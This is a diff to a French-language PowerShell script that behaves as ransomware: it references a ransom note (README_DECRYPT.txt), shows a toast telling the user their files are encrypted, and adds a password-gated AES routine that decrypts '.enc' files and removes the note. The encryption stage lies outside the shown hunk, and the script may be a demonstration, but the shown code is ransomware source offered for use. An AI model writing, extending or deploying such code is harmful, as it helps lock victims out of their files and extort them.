@@ -52,16 +52,58 @@ Write-Host "Note de rancon creee : README_DECRYPT.txt"
 
 # --- NOTIFICATION TOAST ---
 [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
-[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
 
-$template = [Windows.UI.Notifications.ToastTemplateType]::ToastText02
-$xml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent($template)
-$xml.GetElementsByTagName("text")[0].AppendChild(
-    $xml.CreateTextNode("FICHIERS CHIFFRES")
-) | Out-Null
-$xml.GetElementsByTagName("text")[1].AppendChild(
-    $xml.CreateTextNode("Vos fichiers ont ete chiffres. Lisez README_DECRYPT.txt")
-) | Out-Null
+$toastXml = @"
+<toast>
+  <visual>
+    <binding template="ToastText02">
+      <text id="1">FICHIERS CHIFFRES</text>
+      <text id="2">Vos fichiers ont ete chiffres. Lisez README_DECRYPT.txt</text>
+    </binding>
+  </visual>
+</toast>
+"@
+
+$xml = New-Object Windows.Data.Xml.Dom.XmlDocument
+$xml.LoadXml($toastXml)
 
 $toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
-[Windows.UI.Notifications.Toast
+[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe").Show($toast)
+
+Write-Host ""
+Write-Host "Tous les fichiers sont chiffres."
+Write-Host ""
+
+# --- DEMANDE MOT DE PASSE ---
+$userPassword = Read-Host "Entrer le mot de passe pour dechiffrer"
+
+if ($userPassword -ne $password)
+{
+    Write-Host "Mot de passe incorrect."
+    exit
+}
+
+# --- DECHIFFREMENT ---
+$encryptedFiles = Get-ChildItem $folder -File -Filter "*.enc"
+
+foreach ($encFile in $encryptedFiles)
+{
+    $data = [System.IO.File]::ReadAllBytes($encFile.FullName)
+    $iv = $data[0..15]
+    $encryptedData = $data[16..($data.Length - 1)]
+    $aes = New-Object System.Security.Cryptography.AesManaged
+    $aes.Key = $key
+    $aes.IV = $iv
+    $decryptor = $aes.CreateDecryptor()
+    $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
+    $originalName = $encFile.FullName -replace '\.enc$', ''
+    [System.IO.File]::WriteAllBytes($originalName, $decryptedData)
+    Remove-Item $encFile.FullName -Force
+    Write-Host "Dechiffre :" $originalName
+}
+
+# --- NETTOYAGE ---
+Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue
+
+Write-Host ""
+Write-Host "Tous les fichiers ont ete dechiffres et restaures."
